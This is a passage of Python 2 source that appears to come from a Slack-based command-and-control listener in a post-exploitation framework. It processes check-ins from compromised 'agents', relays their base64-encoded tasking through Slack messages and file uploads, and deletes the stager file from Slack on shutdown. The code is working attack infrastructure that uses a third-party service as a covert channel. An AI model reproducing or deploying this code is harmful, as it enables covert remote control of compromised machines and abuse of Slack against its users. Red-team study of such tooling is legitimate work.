                                post_data(agent_upload,agent,channel_id,thread_ts,listener_name,user_api_token)

                            else:

                                # Process agent checking and handle any agent data
                                seen_time = datetime.utcfromtimestamp(float(thread_ts))
                                self.mainMenu.agents.update_agent_lastseen_db(agent, seen_time)
                                task_data = self.mainMenu.agents.handle_agent_data(staging_key, data, listener_options, update_lastseen=False)

                                # Process any further tasks for the agent so it can continue
                                if task_data:
                                    for task in task_data:
                                        lang, data = task
                                        if data and data != "VALID":
                                            slack_client.api_call('chat.postMessage', channel=channel_id, text="Starting", thread_ts=thread_ts)
                                            data_thread = post_data(base64.encodestring(data),agent,channel_id,None,listener_name,user_api_token)
                                            slack_client.api_call('chat.postMessage', channel=channel_id, text=data_thread, thread_ts=thread_ts)

                   
                except Exception as e:
                    print helpers.color("[!] Something went wrong with the Slack bot: " + str(e))
                    print helpers.color("[!] {}".format(traceback.format_exc()))

        else:
            print helpers.color("[!] Connection failed. Exception printed above.")
        


    def start(self, name=''):
        """
        If a server component needs to be started, implement the kick off logic
        here and the actual server code in another function to facilitate threading
        (i.e. start_server() in the http listener).
        """

        listenerOptions = self.options
        if name and name != '':
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            self.threads[name].start()
            time.sleep(1)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()
        else:
            name = listenerOptions['Name']['Value']
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            self.threads[name].start()
            time.sleep(1)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()

        return True


    def shutdown(self, name=''):
        """
        If a server component was started, implement the logic that kills the particular
        named listener here.
        """

        # grab the file id and delte the file from Slack no need to waste file space
        listener_name = self.options['Name']['Value']
        file_id = self.mainMenu.listeners.activeListeners[listener_name]['stager_id']
        print helpers.color('[!] Deleting stager that is no longer required, stager id: ' + file_id)
        user_api_token = self.options['UserAPIToken']['Value']
        user_slack_client = SlackClient(user_api_token)
        response = user_slack_client.api_call("files.delete", file=file_id)
        if 'error' in response:
            print helpers.color('[!] Failed to delete stager file: ' + response["error"])

        # kill the listener
        if name and name != '':
            print helpers.color("[!] Killing listener '%s'" % (name))
            self.threads[name].kill()
        else:
            print helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value']))
            self.threads[self.options['Name']['Value']].kill()

        pass